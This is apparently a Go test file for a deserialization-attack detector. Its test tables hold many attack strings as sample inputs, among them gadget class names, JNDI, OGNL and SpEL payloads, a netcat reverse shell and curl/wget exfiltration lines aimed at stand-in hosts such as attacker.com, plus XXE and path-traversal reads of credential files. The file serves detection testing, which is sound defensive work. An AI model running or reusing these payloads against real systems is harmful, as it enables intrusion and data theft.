package test

import (
	"strings"
	"testing"
	"time"

	"github.com/Lands-Horizon-Corp/malstring/detectors"
)

func TestNewDeserialization(t *testing.T) {
	detector := detectors.NewDeserialization()
	if detector == nil {
		t.Fatal("NewDeserialization() returned nil")
	}
}

func TestDeserializationDetector_Name(t *testing.T) {
	detector := detectors.NewDeserialization()
	expected := "deserialization"
	if detector.Name() != expected {
		t.Errorf("Expected name %s, got %s", expected, detector.Name())
	}
}

func TestDeserializationDetector_Check(t *testing.T) {
	detector := detectors.NewDeserialization()

	testCases := []struct {
		name     string
		input    string
		expected bool
	}{
		// Java Deserialization Attacks
		{
			name:     "Java serialization magic bytes",
			input:    "\\xAC\\xED\\x00\\x05test",
			expected: true,
		},
		{
			name:     "Base64 Java serialization magic",
			input:    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
			expected: true,
		},
		{
			name:     "Java class descriptor",
			input:    "\\x72\\x00java.lang.Object",
			expected: true,
		},
		{
			name:     "Apache Commons Collections InvokerTransformer",
			input:    "org.apache.commons.collections.functors.InvokerTransformer",
			expected: true,
		},
		{
			name:     "Apache Commons Collections4 gadget",
			input:    "org.apache.commons.collections4.functors.InvokerTransformer",
			expected: true,
		},
		{
			name:     "ChainedTransformer gadget",
			input:    "org.apache.commons.collections.functors.ChainedTransformer",
			expected: true,
		},
		{
			name:     "JdbcRowSetImpl gadget",
			input:    "com.sun.rowset.JdbcRowSetImpl",
			expected: true,
		},
		{
			name:     "BadAttributeValueExpException gadget",
			input:    "javax.management.BadAttributeValueExpException",
			expected: true,
		},
		{
			name:     "PriorityQueue gadget",
			input:    "java.util.PriorityQueue",
			expected: true,
		},
		{
			name:     "SignedObject gadget",
			input:    "java.security.SignedObject",
			expected: true,
		},
		{
			name:     "SerializedLambda exploitation",
			input:    "java.lang.invoke.SerializedLambda",
			expected: true,
		},

		// .NET Deserialization Attacks
		{
			name:     ".NET BinaryFormatter magic",
			input:    "\\x00\\x01\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF\\x01\\x00\\x00\\x00",
			expected: true,
		},
		{
			name:     "Base64 .NET BinaryFormatter",
			input:    "AAEAAAD/////AQAAAAAAAAAEAQ",
			expected: true,
		},
		{
			name:     ".NET TempFileCollection gadget",
			input:    "System.CodeDom.Compiler.TempFileCollection",
			expected: true,
		},
		{
			name:     ".NET AssemblyInstaller gadget",
			input:    "System.Configuration.Install.AssemblyInstaller",
			expected: true,
		},
		{
			name:     ".NET ObjectDataProvider gadget",
			input:    "System.Windows.Data.ObjectDataProvider",
			expected: true,
		},
		{
			name:     ".NET WorkflowDesigner gadget",
			input:    "System.Activities.Presentation.WorkflowDesigner",
			expected: true,
		},
		{
			name:     ".NET PSObject gadget",
			input:    "System.Management.Automation.PSObject",
			expected: true,
		},
		{
			name:     "XML ObjectDataProvider exploitation",
			input:    "<ObjectDataProvider x:Key=\"key\" MethodName=\"Start\">",
			expected: true,
		},
		{
			name:     "ResourceDictionary exploitation",
			input:    "<ResourceDictionary Source=\"http://attacker.com/evil.xaml\"/>",
			expected: true,
		},

		// PHP Deserialization Attacks
		{
			name:     "PHP object serialization",
			input:    "O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}",
			expected: true,
		},
		{
			name:     "PHP array serialization",
			input:    "a:2:{i:0;s:4:\"test\";i:1;s:5:\"value\";}",
			expected: true,
		},
		{
			name:     "PHP string serialization",
			input:    "s:11:\"test string\";",
			expected: true,
		},
		{
			name:     "PHP serialization pattern",
			input:    "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:32:\"hash\";}",
			expected: true,
		},

		// Python Pickle Attacks
		{
			name:     "Python pickle protocol 2",
			input:    "\\x80\\x02test",
			expected: true,
		},
		{
			name:     "Python pickle protocol 3",
			input:    "\\x80\\x03]q\\x00",
			expected: true,
		},
		{
			name:     "Python pickle protocol 4",
			input:    "\\x80\\x04data",
			expected: true,
		},
		{
			name:     "Python pickle protocol 5",
			input:    "\\x80\\x05content",
			expected: true,
		},
		{
			name:     "Python pickle module import",
			input:    "\\x8cposix\\nsystem",
			expected: true,
		},
		{
			name:     "Python os.system exploitation",
			input:    "cos\\nsystem\\nq\\x00.",
			expected: true,
		},
		{
			name:     "Python subprocess.Popen exploitation",
			input:    "csubprocess\\nPopen\\nq\\x00.",
			expected: true,
		},
		{
			name:     "Python eval exploitation",
			input:    "c__main__\\neval\\nq\\x00.",
			expected: true,
		},
		{
			name:     "Python3 eval exploitation",
			input:    "cbuiltins\\neval\\nq\\x00.",
			expected: true,
		},
		{
			name:     "Python3 exec exploitation",
			input:    "cbuiltins\\nexec\\nq\\x00.",
			expected: true,
		},
		{
			name:     "Python builtin module",
			input:    "c__builtin__\\ngetattr",
			expected: true,
		},

		// Ruby Marshal Attacks
		{
			name:     "Ruby Marshal magic bytes",
			input:    "\\x04\\x08test",
			expected: true,
		},
		{
			name:     "Base64 Ruby Marshal",
			input:    "BAh7BiIJbmFtZSIKYWRtaW4=",
			expected: true,
		},

		// JavaScript/Node.js Attacks
		{
			name:     "Prototype pollution attack",
			input:    "{\"__proto__\": {\"isAdmin\": true}}",
			expected: true,
		},
		{
			name:     "Constructor pollution",
			input:    "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
			expected: true,
		},
		{
			name:     "JavaScript prototype manipulation",
			input:    "{\"prototype\": {\"admin\": true}}",
			expected: true,
		},
		{
			name:     "Node-serialize exploitation",
			input:    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\"}",
			expected: true,
		},
		{
			name:     "Serialize-javascript exploitation",
			input:    "serialize-javascript vulnerable payload",
			expected: true,
		},
		{
			name:     "Funcster exploitation",
			input:    "funcster deserialization payload",
			expected: true,
		},
		{
			name:     "JavaScript eval injection",
			input:    "eval(require('child_process').exec('whoami'))",
			expected: true,
		},
		{
			name:     "Function constructor exploitation",
			input:    "Function('return require(\"child_process\").exec(\"id\")')();",
			expected: true,
		},

		// JSON Type Confusion Attacks
		{
			name:     "JSON.NET $type confusion",
			input:    "{\"$type\":\"System.Windows.Data.ObjectDataProvider\"}",
			expected: true,
		},
		{
			name:     "FastJSON @type injection",
			input:    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}",
			expected: true,
		},
		{
			name:     "Jackson @class injection",
			input:    "{\"@class\":\"org.apache.commons.collections.functors.InvokerTransformer\"}",
			expected: true,
		},
		{
			name:     "Jackson @JsonTypeInfo",
			input:    "@JsonTypeInfo(use=JsonTypeInfo.Id.CLASS)",
			expected: true,
		},

		// YAML Deserialization Attacks
		{
			name:     "PyYAML arbitrary object creation",
			input:    "!!python/object/apply:os.system ['id']",
			expected: true,
		},
		{
			name:     "SnakeYAML Java object creation",
			input:    "!!java/object:javax.script.ScriptEngineManager",
			expected: true,
		},
		{
			name:     "Ruby YAML object creation",
			input:    "!!ruby/object:Gem::Installer",
			expected: true,
		},

		// XML Deserialization Attacks
		{
			name:     "XStream dynamic-proxy",
			input:    "<dynamic-proxy><interface>java.lang.Comparable</interface>",
			expected: true,
		},
		{
			name:     "XStream Nashorn exploitation",
			input:    "<jdk.nashorn.internal.objects.NativeString>",
			expected: true,
		},
		{
			name:     "XXE SYSTEM entity",
			input:    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
			expected: true,
		},
		{
			name:     "XXE PUBLIC entity",
			input:    "<!ENTITY xxe PUBLIC \"-//W3C//DTD XHTML 1.0//EN\" \"file:///etc/hosts\">",
			expected: true,
		},

		// RMI/JNDI Attacks
		{
			name:     "RMI registry attack",
			input:    "rmi://attacker.com:1099/exploit",
			expected: true,
		},
		{
			name:     "LDAP JNDI attack",
			input:    "ldap://attacker.com:389/exploit",
			expected: true,
		},
		{
			name:     "JNDI lookup",
			input:    "jndi:ldap://evil.com/exploit",
			expected: true,
		},

		// Template Injection Attacks
		{
			name:     "EL injection with getClass",
			input:    "${object.getClass().forName('java.lang.Runtime')}",
			expected: true,
		},
		{
			name:     "Template injection with constructor",
			input:    "{{object.getClass.constructor}}",
			expected: true,
		},
		{
			name:     "Server-side template injection",
			input:    "{{config.items()}}",
			expected: true,
		},
		{
			name:     "Flask/Jinja2 SSTI",
			input:    "{{request.__class__}}",
			expected: true,
		},
		{
			name:     "Django SSTI",
			input:    "{{session.items}}",
			expected: true,
		},

		// Reflection-based Attacks
		{
			name:     "Java reflection forName",
			input:    "Class.forName(\"java.lang.Runtime\")",
			expected: true,
		},
		{
			name:     "Java getMethod exploitation",
			input:    "getMethod(\"exec\", String.class)",
			expected: true,
		},
		{
			name:     "Java invoke method",
			input:    "invoke(runtime, \"whoami\")",
			expected: true,
		},
		{
			name:     "Java getClass forName chain",
			input:    "getClass().forName(\"java.lang.ProcessBuilder\")",
			expected: true,
		},
		{
			name:     "Java getDeclaredMethod",
			input:    "getDeclaredMethod(\"defineClass\", byte[].class)",
			expected: true,
		},
		{
			name:     "Java setAccessible bypass",
			input:    "setAccessible(true)",
			expected: true,
		},
		{
			name:     "Java newInstance exploitation",
			input:    "newInstance()",
			expected: true,
		},

		// Expression Language Injections
		{
			name:     "JSF EL applicationScope",
			input:    "${applicationScope['javax.servlet.context.tempdir']}",
			expected: true,
		},
		{
			name:     "JSF EL sessionScope",
			input:    "${sessionScope.user}",
			expected: true,
		},
		{
			name:     "JSF EL requestScope",
			input:    "${requestScope.parameter}",
			expected: true,
		},
		{
			name:     "JSF EL param injection",
			input:    "${param.cmd}",
			expected: true,
		},
		{
			name:     "OGNL context injection",
			input:    "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}",
			expected: true,
		},
		{
			name:     "OGNL Runtime exploitation",
			input:    "%{@java.lang.Runtime@getRuntime().exec('id')}",
			expected: true,
		},
		{
			name:     "SpEL Runtime injection",
			input:    "T(java.lang.Runtime).getRuntime().exec('whoami')",
			expected: true,
		},
		{
			name:     "SpEL ProcessBuilder injection",
			input:    "T(java.lang.ProcessBuilder)('id').start()",
			expected: true,
		},
		{
			name:     "MVEL injection",
			input:    "Runtime.getRuntime().exec('nc -e /bin/sh attacker.com 4444')",
			expected: true,
		},

		// Unsafe Deserialization Method Calls
		{
			name:     "ObjectInputStream readObject",
			input:    "ObjectInputStream.readObject()",
			expected: true,
		},
		{
			name:     "readUnshared method call",
			input:    "readUnshared(inputStream)",
			expected: true,
		},
		{
			name:     "readExternal method call",
			input:    "readExternal(input)",
			expected: true,
		},
		{
			name:     "XMLDecoder usage",
			input:    "new XMLDecoder(inputStream)",
			expected: true,
		},
		{
			name:     "JAXB Unmarshaller",
			input:    "Unmarshaller.unmarshal(source)",
			expected: true,
		},
		{
			name:     ".NET BinaryFormatter",
			input:    "BinaryFormatter.Deserialize(stream)",
			expected: true,
		},
		{
			name:     ".NET NetDataContractSerializer",
			input:    "NetDataContractSerializer.Deserialize(stream)",
			expected: true,
		},
		{
			name:     ".NET JavaScriptSerializer",
			input:    "JavaScriptSerializer.Deserialize<T>(input)",
			expected: true,
		},

		// Code Execution Patterns
		{
			name:     "Process execution with exec",
			input:    "exec(\"/bin/sh -c 'whoami'\")",
			expected: true,
		},
		{
			name:     "Process spawn",
			input:    "spawn('sh', ['-c', 'id'])",
			expected: true,
		},
		{
			name:     "System call",
			input:    "system('cat /etc/passwd')",
			expected: true,
		},
		{
			name:     "Node.js require injection",
			input:    "require('child_process')",
			expected: true,
		},
		{
			name:     "Dynamic import",
			input:    "import('child_process')",
			expected: true,
		},
		{
			name:     "setTimeout code execution",
			input:    "setTimeout('alert(1)', 1000)",
			expected: true,
		},
		{
			name:     "setInterval code execution",
			input:    "setInterval('console.log(\"pwned\")', 5000)",
			expected: true,
		},

		// File System Access
		{
			name:     "Path traversal with open",
			input:    "open('../../../etc/passwd')",
			expected: true,
		},
		{
			name:     "File read with traversal",
			input:    "read('/etc/shadow')",
			expected: true,
		},
		{
			name:     "File write with traversal",
			input:    "write('C:\\\\Windows\\\\system32\\\\evil.exe')",
			expected: true,
		},
		{
			name:     "Path traversal sequences",
			input:    "../../../../etc/passwd",
			expected: true,
		},
		{
			name:     "Windows path traversal",
			input:    "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
			expected: true,
		},
		{
			name:     "URL encoded path traversal",
			input:    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			expected: true,
		},

		// SQL/LDAP/Command Injection in Serialized Data
		{
			name:     "SQL injection in deserialized data",
			input:    "SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admin",
			expected: true,
		},
		{
			name:     "LDAP injection wildcard",
			input:    "(uid=admin*)(|(objectClass=*))",
			expected: true,
		},
		{
			name:     "Command injection chain",
			input:    "test; cat /etc/passwd | nc attacker.com 4444",
			expected: true,
		},
		{
			name:     "Command injection with pipe",
			input:    "input | wget http://evil.com/shell.sh -O /tmp/shell.sh",
			expected: true,
		},
		{
			name:     "Command injection with AND",
			input:    "valid_cmd && curl -d @/etc/passwd http://evil.com/",
			expected: true,
		},

		// Native Library Loading
		{
			name:     "System.loadLibrary exploitation",
			input:    "System.loadLibrary(\"evil\")",
			expected: true,
		},
		{
			name:     "System.load exploitation",
			input:    "System.load(\"/tmp/evil.so\")",
			expected: true,
		},

		// Memory Corruption Indicators
		{
			name:     "Null byte injection",
			input:    "test\\x00\\x00\\x00\\x00\\x00data",
			expected: true,
		},
		{
			name:     "0xFF byte pattern",
			input:    "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF",
			expected: true,
		},
		{
			name:     "Buffer overflow pattern",
			input:    "AAAAAAAAAAAAAAAA",
			expected: true,
		},
		{
			name:     "NOP sled pattern",
			input:    "\\x90\\x90\\x90\\x90\\x90",
			expected: true,
		},
		{
			name:     "Shellcode XOR pattern",
			input:    "\\x31\\xC0\\x50\\x68",
			expected: true,
		},
		{
			name:     "JMP instruction",
			input:    "\\xEB\\x10shellcode",
			expected: true,
		},
		{
			name:     "CALL instruction",
			input:    "\\xE8\\x12\\x34\\x56\\x78",
			expected: true,
		},

		// Base64 Encoded Payloads
		{
			name:     "Large base64 payload (potential)",
			input:    "eyJhZG1pbiI6dHJ1ZSwidXNlcklkIjoxMjM0NTY3ODkwLCJyb2xlcyI6WyJhZG1pbiIsInN1cGVyX3VzZXIiXSwiZXhwIjoxNjk5OTk5OTk5fQ==",
			expected: true,
		},
		{
			name:     "Very long base64 string",
			input:    strings.Repeat("YWJjZGVmZ2hpams=", 20), // 20 * 16 = 320 chars > 100
			expected: true,
		},

		// Data Exfiltration
		{
			name:     "HTTP data exfiltration",
			input:    "http://attacker.com/steal?data=sensitive_info",
			expected: true,
		},
		{
			name:     "FTP data exfiltration",
			input:    "ftp://evil.com/upload?data=passwords",
			expected: true,
		},
		{
			name:     "DNS exfiltration via Burp Collaborator",
			input:    "dGVzdGRhdGExMjM0NTY3ODkw.burpcollaborator.net",
			expected: true,
		},
		{
			name:     "DNS exfiltration via DNSLog",
			input:    "abcdefghij1234567890.dnslog.cn",
			expected: true,
		},
		{
			name:     "DNS exfiltration via CEYE",
			input:    "exfiltrated1234567890data.ceye.io",
			expected: true,
		},

		// Case Insensitive Matching
		{
			name:     "Case insensitive Java gadget",
			input:    "JAVAX.MANAGEMENT.BADATTRIBUTEVALUEEXPEXCEPTION",
			expected: true,
		},
		{
			name:     "Case insensitive .NET gadget",
			input:    "system.codedom.compiler.tempfilecollection",
			expected: true,
		},
		{
			name:     "Mixed case eval",
			input:    "EvAl('malicious code')",
			expected: true,
		},

		// Complex Payload Examples
		{
			name:     "Combined Java deserialization attack",
			input:    "rO0ABXNyADNvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVy",
			expected: true,
		},
		{
			name:     "Prototype pollution in JSON",
			input:    "{\"__proto__\": {\"polluted\": true, \"isAdmin\": true}}",
			expected: true,
		},
		{
			name:     "Spring expression injection",
			input:    "#{T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
			expected: false, // This doesn't match our patterns, would need #{} pattern
		},

		// Negative Cases - Should NOT detect
		{
			name:     "Normal JSON",
			input:    "{\"name\": \"John\", \"age\": 30, \"active\": true}",
			expected: false,
		},
		{
			name:     "Regular Java class name",
			input:    "com.example.UserService",
			expected: false,
		},
		{
			name:     "Normal .NET namespace",
			input:    "System.String",
			expected: false,
		},
		{
			name:     "Regular PHP array",
			input:    "$array = array('key' => 'value');",
			expected: false,
		},
		{
			name:     "Normal Python code",
			input:    "import os; print('Hello World')",
			expected: false,
		},
		{
			name:     "Regular base64 (short)",
			input:    "SGVsbG8gV29ybGQ=", // "Hello World"
			expected: false,
		},
		{
			name:     "Normal file path",
			input:    "/home/user/documents/file.txt",
			expected: false,
		},
		{
			name:     "Regular URL",
			input:    "https://www.example.com/api/users",
			expected: false,
		},
		{
			name:     "Empty string",
			input:    "",
			expected: false,
		},
		{
			name:     "Plain text",
			input:    "This is just normal text content",
			expected: false,
		},
		{
			name:     "Normal XML",
			input:    "<user><name>John</name><age>30</age></user>",
			expected: false,
		},
		{
			name:     "Regular YAML",
			input:    "name: John\\nage: 30\\nactive: true",
			expected: false,
		},
		{
			name:     "Normal method call",
			input:    "user.getName()",
			expected: false,
		},
		{
			name:     "Regular SQL query",
			input:    "SELECT name, email FROM users WHERE active = 1",
			expected: false,
		},
		{
			name:     "Normal web request",
			input:    "GET /api/users HTTP/1.1\\nHost: example.com",
			expected: false,
		},
		{
			name:     "Configuration data",
			input:    "server.port=8080\\nspring.profiles.active=prod",
			expected: false,
		},
		{
			name:     "Log entry",
			input:    "2024-01-01 10:00:00 INFO UserService - User logged in: john@example.com",
			expected: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := detector.Check(tc.input)
			if result != tc.expected {
				t.Errorf("For input %q, expected %v but got %v", tc.input, tc.expected, result)
			}
		})
	}
}

func TestDeserializationDetector_IntegrationWithScanner(t *testing.T) {
	detector := detectors.NewDeserialization()

	testInputs := []struct {
		input       string
		description string
		expected    bool
	}{
		{"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "Java serialization", true},
		{"{\"__proto__\": {\"isAdmin\": true}}", "Prototype pollution", true},
		{"org.apache.commons.collections.functors.InvokerTransformer", "Java gadget", true},
		{"System.CodeDom.Compiler.TempFileCollection", ".NET gadget", true},
		{"O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}", "PHP serialization", true},
		{"\\x80\\x02cos\\nsystem", "Python pickle", true},
		{"{\"name\": \"John\", \"age\": 30}", "Normal JSON", false},
		{"Clean input without deserialization", "Clean input", false},
	}

	for _, test := range testInputs {
		result := detector.Check(test.input)
		if result != test.expected {
			t.Errorf("Integration test failed for %q (%s): expected %v, got %v",
				test.input, test.description, test.expected, result)
		}
	}
}

func BenchmarkDeserializationDetector_Check(t *testing.B) {
	detector := detectors.NewDeserialization()
	testInput := "rO0ABXNyADNvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVy"

	t.ResetTimer()
	for i := 0; i < t.N; i++ {
		detector.Check(testInput)
	}
}

func TestDeserializationDetector_LargeInput(t *testing.T) {
	detector := detectors.NewDeserialization()

	// Test with large input to ensure no performance issues
	largeInput := ""
	for range 1000 {
		largeInput += "normal text "
	}
	largeInput += "org.apache.commons.collections.functors.InvokerTransformer"

	result := detector.Check(largeInput)
	if !result {
		t.Error("Should detect deserialization attack in large input")
	}
}

// Test for false positives - legitimate content that shouldn't be flagged
func TestDeserializationDetector_FalsePositives(t *testing.T) {
	detector := detectors.NewDeserialization()

	legitimateInputs := []string{
		"User authentication successful",
		"Processing user input data",
		"System configuration loaded",
		"Application started successfully",
		"Database connection established",
		"File uploaded to server",
		"Email notification sent",
		"Cache cleared successfully",
		"Session timeout configured",
		"Security settings updated",
		"API endpoint registered",
		"Service initialization complete",
		"Configuration file parsed",
		"User session created",
		"Data validation passed",
		"Request processing started",
		"Response generation complete",
		"Error handling configured",
		"Logging system initialized",
		"Monitoring alerts enabled",
		"Backup process started",
		"Update installation complete",
		"Performance metrics collected",
		"Health check passed",
		"Load balancer configured",
		"SSL certificate validated",
		"Database migration complete",
		"Feature flag enabled",
		"Rate limiting applied",
		"Content security policy set",
	}

	for _, input := range legitimateInputs {
		result := detector.Check(input)
		if result {
			t.Errorf("False positive detected for legitimate input: %q", input)
		}
	}
}

// Test for evasion attempts
func TestDeserializationDetector_EvasionAttempts(t *testing.T) {
	detector := detectors.NewDeserialization()

	evasionAttempts := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "Case variation evasion",
			input:    "JAVAX.MANAGEMENT.BADATTRIBUTEVALUEEXPEXCEPTION",
			expected: true,
		},
		{
			name:     "Mixed case .NET gadget",
			input:    "SyStEm.CoDeDom.CoMpIlEr.TeMpFiLeCoLlEcTiOn",
			expected: true,
		},
		{
			name:     "Whitespace evasion in eval",
			input:    "eval ( 'malicious code' )",
			expected: true,
		},
		{
			name:     "Mixed case prototype pollution",
			input:    "{\"__PROTO__\": {\"admin\": true}}",
			expected: true,
		},
		{
			name:     "Obfuscated Java class",
			input:    "org.apache.commons.collections.functors.invoketransformer",
			expected: true,
		},
		{
			name:     "Spaced readObject call",
			input:    "readObject ( inputStream )",
			expected: true,
		},
		{
			name:     "Mixed case system call",
			input:    "SyStEm('whoami')",
			expected: true,
		},
		{
			name:     "Varied spacing in exec",
			input:    "exec  (  '/bin/sh'  )",
			expected: true,
		},
		{
			name:     "Case mixed require",
			input:    "ReQuIrE('child_process')",
			expected: true,
		},
		{
			name:     "Spaced forName call",
			input:    "Class . forName ( \"java.lang.Runtime\" )",
			expected: false, // Dots with spaces won't match
		},
	}

	for _, test := range evasionAttempts {
		t.Run(test.name, func(t *testing.T) {
			result := detector.Check(test.input)
			if result != test.expected {
				t.Errorf("Evasion test %q failed: expected %v, got %v", test.name, test.expected, result)
			}
		})
	}
}

// Test for ReDoS (Regular Expression Denial of Service) resistance
func TestDeserializationDetector_ReDoSResistance(t *testing.T) {
	detector := detectors.NewDeserialization()

	// These inputs could cause catastrophic backtracking in poorly designed regexes
	maliciousInputs := []struct {
		name  string
		input string
	}{
		{
			name:  "Repeated Java magic pattern",
			input: strings.Repeat("\\xAC\\xED\\x00\\x05", 100),
		},
		{
			name:  "Long Java class name chain",
			input: "org.apache.commons.collections.functors." + strings.Repeat("InvokerTransformer.", 500) + "test",
		},
		{
			name:  "Excessive PHP serialization",
			input: strings.Repeat("O:4:\"test\":1:{s:4:\"name\";s:5:\"value\";}", 200),
		},
		{
			name:  "Mixed repeated patterns",
			input: strings.Repeat("readObject()", 1000) + strings.Repeat("eval()", 1000),
		},
		{
			name:  "Long base64 pattern",
			input: strings.Repeat("YWJjZGVmZ2hpams=", 200), // 200 * 16 = 3200 chars
		},
		{
			name:  "Excessive prototype pollution",
			input: strings.Repeat("{\"__proto__\":", 500) + "{}}" + strings.Repeat("}", 500),
		},
		// Deserialization-specific catastrophic backtracking patterns
		{
			name:  "Nested .NET gadget chains",
			input: strings.Repeat("System.CodeDom.Compiler.TempFileCollection.", 300) + "exploit",
		},
		{
			name:  "Excessive Python pickle patterns",
			input: strings.Repeat("\\x80\\x02", 2000) + "cposix\\nsystem",
		},
		{
			name:  "Long reflection chain",
			input: strings.Repeat("getClass().forName().getMethod().", 100) + "invoke()",
		},
		{
			name:  "Massive template injection",
			input: "${" + strings.Repeat("class.forName.", 1000) + "exploit}",
		},
		{
			name:  "Excessive OGNL injection",
			input: "%{" + strings.Repeat("#context.", 500) + "exploit}",
		},
		{
			name:  "Long SpEL expression",
			input: "T(" + strings.Repeat("java.lang.Runtime", 200) + ").getRuntime().exec('id')",
		},
		{
			name:  "Deep XML deserialization",
			input: strings.Repeat("<ObjectDataProvider>", 1000) + "exploit" + strings.Repeat("</ObjectDataProvider>", 1000),
		},
		{
			name:  "Excessive YAML object creation",
			input: strings.Repeat("!!python/object/apply:os.system", 300),
		},
		{
			name:  "Long RMI/JNDI chain",
			input: strings.Repeat("rmi://", 500) + "attacker.com:1099/" + strings.Repeat("exploit", 500),
		},
		{
			name:  "Massive JavaScript eval chain",
			input: strings.Repeat("eval(", 1000) + "malicious" + strings.Repeat(")", 1000),
		},
		{
			name:  "Extensive file access pattern",
			input: "open(" + strings.Repeat("../", 2000) + "etc/passwd)",
		},
		{
			name:  "Long command injection",
			input: strings.Repeat("system('", 500) + "id" + strings.Repeat("')", 500),
		},
		{
			name:  "Excessive memory corruption pattern",
			input: strings.Repeat("\\x00", 10000),
		},
		{
			name:  "Deep shellcode pattern",
			input: strings.Repeat("\\x90", 5000) + "\\x31\\xC0\\x50\\x68",
		},
		{
			name:  "Long path traversal",
			input: strings.Repeat("../", 3000) + "etc/passwd",
		},
		{
			name:  "Massive SQL injection in deserialized data",
			input: "SELECT " + strings.Repeat("column,", 1000) + " FROM users WHERE " + strings.Repeat("condition OR ", 1000) + "1=1",
		},
		{
			name:  "Extensive LDAP injection",
			input: strings.Repeat("(uid=*", 1000) + strings.Repeat(")", 1000),
		},
		{
			name:  "Deep native library loading",
			input: strings.Repeat("System.loadLibrary(", 500) + "evil" + strings.Repeat(")", 500),
		},
		{
			name:  "Excessive data exfiltration URLs",
			input: strings.Repeat("http://attacker.com/steal?data=", 200) + strings.Repeat("sensitive", 500),
		},
		{
			name:  "Long DNS exfiltration pattern",
			input: strings.Repeat("a", 10000) + ".burpcollaborator.net",
		},
		// Advanced catastrophic backtracking patterns
		{
			name:  "Exponential backtracking with nested groups",
			input: strings.Repeat("(readObject", 100) + "test" + strings.Repeat(")", 100),
		},
		{
			name:  "Polynomial backtracking with alternations",
			input: strings.Repeat("aaa", 1000) + "readObject",
		},
		{
			name:  "Evil regex pattern with optional quantifiers",
			input: strings.Repeat("a", 2000) + "ObjectInputStream",
		},
		{
			name:  "Deeply nested deserialization structure",
			input: strings.Repeat("(Java", 200) + "serialization" + strings.Repeat(")", 200),
		},
		{
			name:  "Massive gadget chain enumeration",
			input: strings.Repeat("org.apache.commons.collections.", 1000) + "functors.InvokerTransformer",
		},
		{
			name:  "Excessive binary pattern matching",
			input: strings.Repeat("\\xAC\\xED", 5000),
		},
		{
			name:  "Catastrophic PHP serialization nesting",
			input: strings.Repeat("O:1:\"a\":", 2000) + "{}",
		},
		{
			name:  "Massive Python pickle module imports",
			input: strings.Repeat("c__builtin__\\n", 2000) + "eval",
		},
		{
			name:  "Excessive Ruby Marshal patterns",
			input: strings.Repeat("\\x04\\x08", 3000),
		},
	}

	for _, test := range maliciousInputs {
		t.Run(test.name, func(t *testing.T) {
			// Use a timeout to ensure the regex doesn't hang
			done := make(chan bool, 1)
			var result bool

			go func() {
				result = detector.Check(test.input)
				done <- true
			}()

			select {
			case <-done:
				// Test passed - regex completed in reasonable time
				t.Logf("ReDoS test %q completed with result: %v", test.name, result)
			case <-time.After(100 * time.Millisecond):
				t.Errorf("ReDoS vulnerability detected: regex took too long for input %q", test.name)
			}
		})
	}
}
